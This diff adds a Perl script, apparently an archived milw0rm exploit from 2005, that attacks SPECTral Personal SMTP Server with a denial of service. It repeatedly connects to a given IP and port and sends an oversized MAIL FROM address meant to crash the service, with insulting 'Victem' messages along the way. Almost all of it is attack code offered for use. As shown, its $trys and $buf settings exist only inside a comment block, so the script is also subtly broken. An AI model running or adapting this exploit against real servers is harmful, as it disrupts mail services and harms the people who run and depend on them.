@@ -1,0 +1,87 @@
+                                                                                                                                                                                                                                                               
+#!/usr/bin/perl
+
+use IO::Socket;
+
+###### Small config ################################
+#                                                  #
+# If service not DoSeD try to increase this value. # 
+#                                                  #
+# Number of trys for DoS.                          #
+#                                                  #
+#   $trys = 10;                                    #
+#                                                  #
+# Quantity signs for atack.                        #
+#                                                  #
+#   $buf = 200000;                                 #
+#                                                  #
+####################################################
+
+if (@ARGV < 1)
+{
+print "\n /\n";
+print "  DoS - SPECTral Personal SMTP Server <= 0.4.2 b 338  \n";
+print "            Usage: Dos_sp_0.3.pl <ip> [port]          \n";
+print "        Coded by GreenwooD Network Security Team      \n\n";      
+print "         ============< nst.void.ru >===========       \n";
+print "                                                      /\n";
+exit();
+
+}
+
+$ip = $ARGV[0];
+
+$port = 25;
+
+if ($ARGV[1])
+{
+ $port=$ARGV[1];
+}
+
+$j=1;
+
+print "\n [+] - Prepare to DoS on $ip:$port\n";
+
+do
+
+{
+
+    $remote = IO::Socket::INET->new( Proto => "tcp",
+                                     PeerAddr  => $ip,
+                                     PeerPort  => $port) or die "\n [-] - Can't connect to $ip:$port or already DoSeD\n";
+
+    $i=1;
+
+    $remote->send("HELO Victem. You going down today. You SMTP service vulnearable, update it. It is exploit usage.\r\n");
+   
+    sleep $i;
+ 
+    $remote->send("MAIL FROM:<" . "A" x $buf . ">\r\n");
+    
+    sleep $i;
+    
+    $remote->send("RCPT TO:<Developers\@mail\.box>\r\n");
+    
+    sleep $i;
+
+    $remote->send("DATA\r\n");
+    
+    sleep $i;
+   
+    $remote->send(" This of shit letter! " . rand(10) . "\r\n");
+
+    sleep $i;
+
+    $remote->send(".\r\n");
+
+    close($remote);
+
+    print " [t] - Number of try = $j\n";
+
+    $j=$j+1;
+
+} until ($j > $trys);
+
+print " [+] - O yes! Service going down...\n";
+
+# milw0rm.com [2005-03-28]
